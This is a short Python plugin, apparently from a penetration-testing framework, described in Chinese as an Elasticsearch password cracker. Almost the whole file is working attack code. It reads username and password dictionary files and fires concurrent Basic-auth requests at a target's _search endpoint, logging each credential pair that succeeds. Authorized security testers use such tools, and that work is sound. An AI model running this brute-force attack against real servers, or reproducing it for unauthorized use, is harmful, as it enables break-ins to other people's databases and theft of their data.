# -*-* coding:UTF-8
import base64
import os
import urllib.parse


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "elasticsearch服务口令破解",
        "datetime": "2022-02-01"
    }

    @cli.options('url', desc="设置输入目标", default='{self.target.value}')
    @cli.options('method', desc="口令爆破模式 1:单点模式 2:交叉模式", type=int, default=2)
    @cli.options('username', desc="用户名称或字典文件", default=os.path.join('data', 'elasticsearch_username.dict'))
    @cli.options('password', desc="用户密码或字典文件", default=os.path.join('data', 'elasticsearch_password.dict'))
    @cli.options('timeout', desc="连接超时时间", type=int, default=3)
    @cli.options('workers', desc="协程并发数量", type=int, default='{self.config.general.asyncio}')
    def url(self, url, method, username, password, timeout, workers) -> dict:
        with self.async_pool(max_workers=workers) as execute:
            for u, p in self.build_login_dict(
                    method=method,
                    username=username,
                    password=password,
            ):
                execute.submit(self.custom_task, url, u, p, timeout)
            return {'LoginInfo': execute.result()}

    async def custom_task(self, url, username, password, timeout):
        self.log.debug(f'Login => username: {username}, password: {password}')
        r = await self.async_http(
            method='get',
            url=urllib.parse.urljoin(url, './_search'),
            headers={
                'Authorization': "Basic " + base64.b64encode(f'{username}:{password}'.encode("utf-8")).decode("utf-8"),
                'Content-Type': 'application/json'
            },
            timeout=timeout
        )
        if r.status_code == 200:
            self.log.info(f'Login => username: {username}, password: {password} [success]')
            return {
                'server': 'elasticsearch',
                'username': username,
                'password': password
            }